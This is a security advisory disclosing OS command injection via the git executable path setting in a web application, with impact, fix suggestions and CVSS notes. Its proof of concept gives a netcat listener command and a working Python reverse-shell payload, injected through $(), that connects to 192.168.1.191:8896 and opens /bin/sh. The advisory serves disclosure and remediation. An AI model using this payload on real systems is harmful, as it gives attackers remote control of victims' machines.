# OS Command Injection via GIT\_PATH

High

[medariox](/medariox)
published
GHSA-6589-x6f5-cgg9
Mar 25, 2023

## Package

github\_updater.py

## Affected versions

< 1.0.11

## Patched versions

1.0.12

## Description

### Summary

An attacker with access to the web interface can update the git executable path in /config/general/ > advanced settings with arbitrary OS commands.

### PoC

This is a reverse shell to the IP address 192.168.1.191 on port 8896. To test, start a netcat listener with `nc -lvnp 8896` and update the command below to the IP address of the listener.

```
$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.191",8896));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')

```

[![pic of reverse shell in action](https://camo.githubusercontent.com/6375381447b3b831370bb386e8fe165678d2d36bade6bb78045393bd0d0e6245/68747470733a2f2f627261636b6973682e696f2f77702d636f6e74656e742f75706c6f6164732f323032332f30322f6769742d706174682e706e67)](https://camo.githubusercontent.com/6375381447b3b831370bb386e8fe165678d2d36bade6bb78045393bd0d0e6245/68747470733a2f2f627261636b6973682e696f2f77702d636f6e74656e742f75706c6f6164732f323032332f30322f6769742d706174682e706e67)

### Impact

Thankfully not many of these are exposed to the internet, but those that are will allow an attacker to take control of their system.

### Fix

From a brief examination, I think change\_GIT\_PATH in config.py could be modified to disallow special characters besides directory separators and also to ensure that the entry contains the string 'git', but I haven't fully explored the code.

Additionally, a username/password combination could be 'forced' upon users upon installation, which would reduce the number of instances that haven't enabled username/password authentication.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
